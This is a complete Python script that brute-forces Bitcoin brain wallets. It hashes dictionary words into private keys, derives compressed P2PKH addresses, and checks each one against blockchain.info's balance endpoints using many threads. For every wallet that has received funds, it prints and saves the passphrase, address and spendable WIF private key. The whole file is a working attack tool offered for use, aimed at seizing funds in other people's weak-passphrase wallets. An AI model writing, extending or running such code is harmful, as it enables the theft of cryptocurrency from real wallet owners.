#!/usr/bin/env python3
"""
brute_p2pkh_coincurve_fast.py
Fast P2PKH-only scanner using coincurve + concurrent HTTP checks against /q endpoints.

Requirements:
    pip3 install coincurve requests base58

Usage:
    python3 brute_p2pkh_coincurve_fast.py --dict dictionary.txt --out found.txt

Tuning flags:
    --http-threads    number of parallel HTTP worker threads (default 24)
    --chunk-size      how many words to derive before logging progress (default 2000)
    --rate-limit      minimal sleep (seconds) each worker will do BEFORE calling an API (default 0.0)
    --api-delay       additional per-request sleep to be polite (default 0.0)
"""
from __future__ import annotations
import argparse, io, sys, os, time, logging, random, threading, queue
import binascii, hashlib
from typing import Tuple
import requests, base58
from coincurve import PrivateKey

# ---------- crypto helpers ----------
def sha256(b: bytes) -> bytes:
    return hashlib.sha256(b).digest()

def hash160(b: bytes) -> bytes:
    return hashlib.new('ripemd160', hashlib.sha256(b).digest()).digest()

def base58check_encode(prefix: bytes, payload20: bytes) -> str:
    raw = prefix + payload20
    checksum = hashlib.sha256(hashlib.sha256(raw).digest()).digest()[:4]
    return base58.b58encode(raw + checksum).decode()

def privhex_from_passphrase(passphrase: str) -> str:
    return binascii.hexlify(sha256(passphrase.encode('utf-8'))).decode()

def wif_from_privhex(priv_hex: str, compressed: bool = True) -> str:
    b = binascii.unhexlify(priv_hex)
    payload = b'\x80' + b
    if compressed:
        payload += b'\x01'
    checksum = hashlib.sha256(hashlib.sha256(payload).digest()).digest()[:4]
    return base58.b58encode(payload + checksum).decode()

def p2pkh_from_pubkey(pubkey_bytes: bytes) -> str:
    rip = hash160(pubkey_bytes)
    return base58check_encode(b'\x00', rip)

# ---------- network helpers (raw /q endpoints) ----------
def _get_raw_numeric(session: requests.Session, url: str, timeout: float = 15.0) -> float:
    """
    Fetch url expecting either a raw number or a small JSON; try to parse numeric.
    Keeps logic minimal like your original script.
    """
    r = session.get(url, timeout=timeout)
    r.raise_for_status()
    text = r.text.strip()
    # try parse as float directly (raw numeric)
    try:
        return float(text)
    except Exception:
        pass
    # fallback: try json-ish values scanning for numeric tokens (very conservative)
    try:
        j = r.json()
        for key in ("total_received","totalReceived","final_balance","finalBalance","balance","received"):
            if isinstance(j, dict) and key in j:
                return float(j[key])
    except Exception:
        pass
    # if nothing parsed, raise
    raise ValueError("Unable to parse numeric from response: " + (text[:200] if text else "<empty>"))

# ---------- worker thread ----------
def http_worker(worker_id: int, in_q: "queue.Queue[Tuple[str,str,str]]", out_file_path: str,
                base_received: str, base_balance: str, rate_limit: float, api_delay: float,
                stop_event: threading.Event, stats: dict):
    """
    Each worker:
      - consumes (word, addr, wif) from queue
      - queries /q/getreceivedbyaddress/addr
      - if received>0 -> query /q/addressbalance/addr
      - writes to found file (append) and prints loud output
    """
    session = requests.Session()
    fout = None
    # Open file handle per worker for append; this avoids contention on single file object in multithread
    # We'll rely on atomic file append on OS and flush each write.
    try:
        fout = open(out_file_path, "a", encoding="utf-8", buffering=1)
    except Exception as e:
        logging.error("Worker %d cannot open output file: %s", worker_id, e)
        stop_event.set()
        return

    while not stop_event.is_set():
        try:
            word, addr, wif = in_q.get(timeout=1.0)
        except Exception:
            # queue empty - exit if main signaled done
            if stop_event.is_set():
                break
            continue

        # politeness sleep and jitter to spread requests
        if rate_limit:
            time.sleep(rate_limit + random.random() * 0.02)
        # First: get received
        received = 0.0
        # For each request we retry a few times with backoff
        max_retries = 4
        for attempt in range(max_retries):
            try:
                url = f"{base_received}/{addr}"
                val = _get_raw_numeric(session, url, timeout=20.0)
                received = float(val)
                break
            except Exception as e:
                # transient backoff
                backoff = (0.5 + random.random()) * (2 ** attempt)
                logging.debug("Worker %d: received fetch error for %s: %s — retry %d sleeping %.2fs", worker_id, addr, e, attempt+1, backoff)
                time.sleep(backoff)
        if received == 0.0:
            stats['checked'] += 1
            in_q.task_done()
            continue

        # If any received > 0, query balance
        balance = 0.0
        for attempt in range(max_retries):
            try:
                url = f"{base_balance}/{addr}"
                val = _get_raw_numeric(session, url, timeout=20.0)
                balance = float(val)
                break
            except Exception as e:
                backoff = (0.5 + random.random()) * (2 ** attempt)
                logging.debug("Worker %d: balance fetch error for %s: %s — retry %d sleeping %.2fs", worker_id, addr, e, attempt+1, backoff)
                time.sleep(backoff)

        # optional tiny api_delay after successful fetch to avoid bursts
        if api_delay:
            time.sleep(api_delay * (0.5 + random.random()))

        # LOUD OUTPUT and write
        try:
            print("\n=== USED WALLET FOUND ===")
            print(f"WORD: {word}")
            print(f"ADDRESS (p2pkh): {addr}")
            print(f"WIF: {wif}")
            print(f"RECEIVED RAW: {received}")
            print(f"CURRENT BALANCE RAW: {balance}")
            print("========================\n")
            fout.write(f"{word},{addr},{wif},{received},{balance}\n")
            fout.flush()
            stats['found'] += 1
        except Exception:
            pass

        stats['checked'] += 1
        in_q.task_done()

    try:
        fout.close()
    except Exception:
        pass
    session.close()

# ---------- orchestrator ----------
def main():
    ap = argparse.ArgumentParser(description="Fast P2PKH scanner using coincurve + /q endpoints")
    ap.add_argument("--dict", "-d", default="dictionary.txt")
    ap.add_argument("--out", "-o", default="found.txt")
    ap.add_argument("--http-threads", type=int, default=24, help="number of concurrent HTTP worker threads")
    ap.add_argument("--chunk-size", type=int, default=2000, help="words between progress logs (and memory chunking)")
    ap.add_argument("--rate-limit", type=float, default=0.0, help="minimal sleep (sec) before each request to spread load")
    ap.add_argument("--api-delay", type=float, default=0.0, help="tiny delay after a successful address check (sec)")
    ap.add_argument("--base-received", default="https://blockchain.info/q/getreceivedbyaddress")
    ap.add_argument("--base-balance", default="https://blockchain.info/q/addressbalance")
    ap.add_argument("--debug", action="store_true")
    args = ap.parse_args()

    logging.basicConfig(level=logging.DEBUG if args.debug else logging.INFO, format="%(asctime)s %(levelname)s %(message)s")

    # verify coincurve available
    try:
        _ = PrivateKey(b'\x01' * 32)
    except Exception as e:
        logging.error("coincurve not available or failing: %s", e)
        sys.exit(1)

    # open dictionary
    try:
        fdict = io.open(args.dict, "rt", encoding="utf-8", errors="ignore")
    except Exception as e:
        logging.error("Cannot open dictionary: %s", e)
        sys.exit(1)

    # prepare queue and workers
    q = queue.Queue(maxsize=args.http_threads * 4 + 1000)  # cap outstanding tasks
    stop_event = threading.Event()
    stats = {'checked': 0, 'found': 0}

    workers = []
    for i in range(args.http_threads):
        t = threading.Thread(target=http_worker, args=(i, q, args.out, args.base_received, args.base_balance, args.rate_limit, args.api_delay, stop_event, stats), daemon=True)
        t.start()
        workers.append(t)

    total = 0
    start = time.time()
    try:
        # stream read
        chunk_count = 0
        for raw in fdict:
            word = raw.strip()
            if not word:
                continue
            total += 1
            # derive address using coincurve (fast)
            try:
                priv_hex = privhex_from_passphrase(word)
                pk = PrivateKey(bytes.fromhex(priv_hex))
                pub = pk.public_key.format(compressed=True)
                addr = p2pkh_from_pubkey(pub)
                wif = wif_from_privhex(priv_hex, compressed=True)
            except Exception as e:
                logging.debug("Derivation failed for word '%s': %s", word, e)
                continue

            # enqueue for network checking (blocks if queue full)
            q.put( (word, addr, wif) )

            # progress log per chunk
            if total % args.chunk_size == 0:
                elapsed = time.time() - start
                rate = total / elapsed if elapsed>0 else 0
                logging.info("Read %d words — queue size:%d — checked:%d found:%d — avg %.2f w/s",
                             total, q.qsize(), stats['checked'], stats['found'], rate)
                chunk_count += 1

        # after EOF wait for queue to drain
        logging.info("Finished reading dictionary (%d words). Waiting for queue to drain...", total)
        q.join()  # wait until all tasks done
    except KeyboardInterrupt:
        logging.info("Interrupted by user — shutting down")
    finally:
        # tell workers to stop
        stop_event.set()
        # give threads a moment to finish cleanly
        for t in workers:
            t.join(timeout=2.0)
        elapsed = time.time() - start
        logging.info("DONE. Total read: %d, checked: %d, found: %d, elapsed: %.1fs, avg %.2f w/s",
                     total, stats['checked'], stats['found'], elapsed, (total / elapsed if elapsed>0 else 0))

if __name__ == "__main__":
    main()